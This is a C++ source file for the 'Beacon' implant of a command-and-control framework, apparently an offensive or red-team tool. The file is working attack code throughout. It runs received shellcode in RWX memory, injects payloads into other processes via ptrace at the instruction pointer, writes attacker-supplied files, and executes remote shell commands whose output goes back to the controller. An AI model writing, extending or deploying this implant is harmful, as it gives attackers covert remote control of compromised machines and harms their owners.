#include "Beacon.hpp"


#ifdef __linux__ 
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#elif _WIN32
// windows code goes here
#endif


using namespace std;


void execAsembly(const std::string& payload)
{

#ifdef __linux__ 

	void* exec = mmap(NULL, payload.size(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memcpy(exec, payload.data(), payload.size());
	((int (*)()) exec)();

#elif _WIN32

#endif

	return;
}


int inject(int pid, const std::string& payload)
{

#ifdef __linux__ 

	pid_t target = pid;

	if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0)
	{
		perror("ptrace(PTRACE_ATTACH)");
		return -1;
	}

	printf("Wait for process...\n");
	wait(NULL);


	struct user_regs_struct regs;
	if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0)
	{
		perror("ptrace(PTRACE_GETREGS)");
		return -1;
	}

	printf("Code injection...\n");

	uint32_t* s = (uint32_t*)payload.data();
	uint32_t* d = (uint32_t*)regs.rip;

	for (int i = 0; i < payload.size(); i += 4, s++, d++)
	{
		if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0)
		{
			perror("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}

	regs.rip += 2;

#elif _WIN32

#endif

	return 0;
}


std::string execBash(const string& cmd)
{
	std::string result;

#ifdef __linux__ 

	std::array<char, 128> buffer;

	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#elif _WIN32

	std::array<char, 128> buffer;

	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#endif


	return result;
}


Beacon::Beacon()
{

}


Beacon::~Beacon()
{

}


bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
	string instruction = c2Message.instruction();

	if (instruction == "upload")
	{
		std::string outputFile = c2Message.outputfile();

		const std::string buffer = c2Message.data();

		std::ofstream output(outputFile, std::ios::binary);
		output << buffer;
		output.close();
	}
	else if (instruction == "exec-asembly")
	{
		const std::string buffer = c2Message.data();

		execAsembly(buffer);
	}
	else if (instruction == "script")
	{
		const std::string buffer = c2Message.data();

		std::string totalOutCmd = execBash(buffer);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_returnvalue(totalOutCmd);
	}
	else if (instruction == "inject")
	{
		const std::string buffer = c2Message.data();
		int pid = c2Message.pidinjection();

		std::unique_ptr<std::thread> threadExec(new std::thread(inject, pid, buffer));
		m_threadsExec.push_back(std::move(threadExec));

		//			std::thread(inject, pid, buffer);
		//			inject(pid, buffer);
	}
	else if (instruction == "run")
	{
		string shellCmd = c2Message.shellcmd();
		std::string outCmd = execBash(shellCmd);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_shellcmd(shellCmd);
		c2RetMessage.set_returnvalue(outCmd);
	}
	else if (instruction == "end")
		return true;

	return false;
}



